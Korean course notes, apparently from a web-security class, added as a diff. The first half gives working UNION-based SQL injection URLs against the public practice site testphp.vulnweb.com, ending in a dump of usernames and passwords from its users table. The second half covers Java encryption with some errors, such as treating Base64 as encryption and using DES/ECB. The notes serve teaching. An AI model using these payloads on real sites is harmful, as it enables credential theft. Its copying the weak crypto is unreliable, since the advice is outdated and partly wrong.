@@ -1,0 +1,193 @@
+3일차(SQL Injection 마무리 및 자바암호화 개요 및 작성법)
+
+http://testphp.vulnweb.com =>공개된 사이트
+-------------------------------------------------- 
+
+http://testphp.vulnweb.com/listproduct.php?cat=1 and 1=0 union all select null
+
+----------------------------------------------------------
+ 뒤에 다 첨부
+
+1.필드의 갯수 파악
+and 1=0 union all select null ->가상테이블->필드갯수? ,DB정보
+                                          ->테이블이름, user->필드명 정보 얻어오기
+-----------------------------------------------------------------------------
+에러가 발생되지 않을 때 까지 null값을 증가 =>필드의 갯수를 확인
+http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0
+ union all select null,null,null,null,null,null,null,null,null,null,null#  =>null이 11개라도 에러안나옴(필드11개)
+
+2.계정정보를 파악
+->select user() =>로그인 계정을 확인이 가능하다. ->show user
+------------------------------------------------------------------------
+->
+3.필드의 갯수를 파악->현재 보고 있는 이 테이블의 정보필드를 확인
+=>null 대신에 번호를 입력->화면에 출력되는 번호가 현재 쓰고 있는 필드를
+    알려주는 역할
+
+4.화면에 표시되는 필드대신에 2,7,9,11번 필드->user()->계정정보
+                                                                   version()->DBMS정보
+
+   5.1.73-0ubuntu0.10.04.1->5.x버전을 사용->MariaDB (10버전이상)
+  --------------------------------------------------------------------------
+   드라이버->mysql드라이버 사용이 가능
+  -----------------------------------------
+
+5.계정과 암호가 들어 있을 만한 테이블 과 해당 필드 찾기
+http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 
+union all select 1,group_concat(table_name),3,4,5,6,version(),8,9,10,11 from 
+information_schema.tables where table_schema=database()#
+                                                     필드명
+MySQL=>information_schema.tables=>사용자가 작성한 테이블의 이름
+                     시스템테이블
+          select   database() =>현재 어떠한 데이터베이스로 접속 작업정보
+
+artists,carts,categ,featured,guestbook,pictures,products,users
+                                          방명록         이미지    상품       계정정보
+
+6.http://testphp.vulnweb.com/listproducts.php?cat=1 and 
+1=0 union all select 1,group_concat(column_name),3,4,5,6,version(),
+8,9,10,11 from information_schema.columns 
+where table_name='users'
+                              ====>테이블의 필드이름을 알고자하는 테이블명
+
+information_schema.columns->테이블의 필드에 대한 정보를 담고 있는 
+                                               mysql의 시스템테이블이름
+
+ table_name->테이블을 검색할때
+ group_concat(column_name(필드명))
+ ->필드의 내용을 문자열의 길이에 상관없이 가로로 출력
+
+uname,pass,cc,address,email,name,phone,cart
+====  ===>계정명,암호 필드
+
+http://testphp.vulnweb.com/listproducts.php?cat=1 and 1=0 union select 1,uname,3,4,5,6,pass,8,9,10,11 from users
+
+계정명,암호->전부 test/test 확인
+======================================
+xss 공격, 에러메세지를 확인==>가능한 에러메세지를 자세한 정보를 출력X
+                                         =>개발자가 따로 만든 에러메세지를 출력하는
+                                              페이지를 만들어서 출력이 될 수 있도록 할것
+
+<bean class="org.springframework.web.servlet.handler.SimpleMappingExceptionResolver">
+        <property name="exceptionMappings">
+            <props>
+                <prop key="java.lang.Exception">pageError</prop>
+            </props>
+        </property>
+</bean>
+-----------------------------------------------------------------------------
+ 자바의 암호화
+
+용어정리:
+
+1.plain text 또는 cleartext(평문):전달해야 할 내용->일반적인 문자열(안녕하세요)
+
+2.ciphertext(암호문):암호화한 내용->특수기호,숫자를 조합=>adag19466*
+
+3.encryption(암호화):평문을 암호문으로 바꾸는 것.
+                                 안녕하세요(String) =2진수(byte[])계산식==>adag19466*(String)
+                                                                                알고리즘
+4.decryption(복호화):암호문을 평문으로 복구하는 것.
+                                adag19466*(String)==>안녕하세요
+
+5.symmetric key(대칭키):평문을 암호문으로, 
+                                     암호문을 평문으로 생성하는 키 값이 같다.(공개키)
+
+                        비대칭키 평문--->암호문(공개키)
+                                     평문<---암호문(비밀키)
+--------------------------------------------------------------------------------
+ 단방향 --------------------->평문-->암호 변경-->암호문--->평문  
+                                                                                X
+                                        암호-->새로 임시 암호를 발급을 받아서 처리
+-------------------------------------------------------------------------
+ 양방향  -->평문--->암호문     =>계정이름,주소,전화번호
+                 암호문-->평문
+---------------------------------------------------------------------------------
+ Base64 클래스를 이용->암호화 또는 복호화할때 필요
+
+ 안녕하세요<-->agaga8agag$#csa->Base64클래스를 이용해서 암호화 끝부분의
+                                                       자리수 맞춤(임의의 문자열을 첨부)
+                                                      Padding(패딩)-> 패딩을  해주는 클래스
+                                                                               Base64클래스
+------------------------------------------------------------------------------------
+
+6.cryptographic algorithm 또는 cipher:암호화와 복호화를 위해 사용하는 수학 함수.
+->Cipher->  평문<->암호화
+                   init(초기화,인증키)  ,dofinal()
+일반적으로 암호화를 위한  함수와 복호화를 위한 함수 두 개로 이루어진다.
+===========================================
+
+WebSecure2(프로젝트명)->문자열을 암호,파일을 암호
+-------------------------------------------------------
+       |
+        -src->LocalEncrypter클래스
+               db
+                |
+                 -Crypt(웹상에서 호출할 메서드->DAO)->문자열,파일(4가지 메서드)
+                 -Contest(서블릿)->doPost()호출
+
+        -WebContent->inputCode.jsp(문자열을 입력)-->
+                               inputCodeProc.jsp 암호화->복호화
+
+                               input.jsp(DB정보를 불러와서 연동?)->접속계정,암호,암호화시킬
+                                                                                                         파일명
+
+                           ->클래스를 작성->불러옴
+-----------------------------------------------------------------
+secure coding 지침서(1.문자열 암호화 2.파일 자체 암호화)
+
+1.중요한 정보->소스코드상에 작성X(주석 포함해서)->DB정보
+                  ->jdbc.properties 작성->불러오기
+
+2.jdbc.properties->암호화->따로 파일을 생성->ktest.properties
+       (원본삭제)------------------------------------------>
+
+ktest.properties-->웹어플리케이션에서는 불러와서 (복호화)->DB연동가능
+-----------------------------------------------------------------------
+
+
+public static void encryptFile(String infile, String outfile) throws Exception {
+               //-------------------------------------------------------------------------
+    	Cipher cipher=Cipher.getInstance("DES/ECB/PKCS5Padding");
+    	//2.Chiper초기화(암호화 옵션,키)
+    	cipher.init(Cipher.ENCRYPT_MODE, getKey());
+    	//3.암호화을 희망하는 파일명->FileInputStream
+//--------------------------------------------------------------------------------
+    	FileInputStream in=new FileInputStream(infile);//jdbc.properties
+    	FileOutputStream fileOut=
+    			           new FileOutputStream(outfile);//새로 암호화된 파일생성
+    	//4.cipher객체->암호화시킬 파일생성(암호화 시킬 파일객체,cipher객체명)
+               //------------------------------------------------------------------
+    	CipherOutputStream out=
+    			new CipherOutputStream(fileOut,cipher);
+               //--------------------------------------------------------------------
+    	//문자열 한라인->암호화
+    	//파일에 암호화시킬 내용을 출력
+    	byte[] buffer=new byte[kBufferSize];//8192->파일의내용
+    	//원본파일-->byte[]->암호화시키는 파일에 담아주는 작업
+    	int length;
+    	while((length=in.read(buffer))!=-1)
+    		out.write(buffer,0,length);//배열,0,배열크기까지
+    	in.close();
+    	out.close();
+    }
+
+
+
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
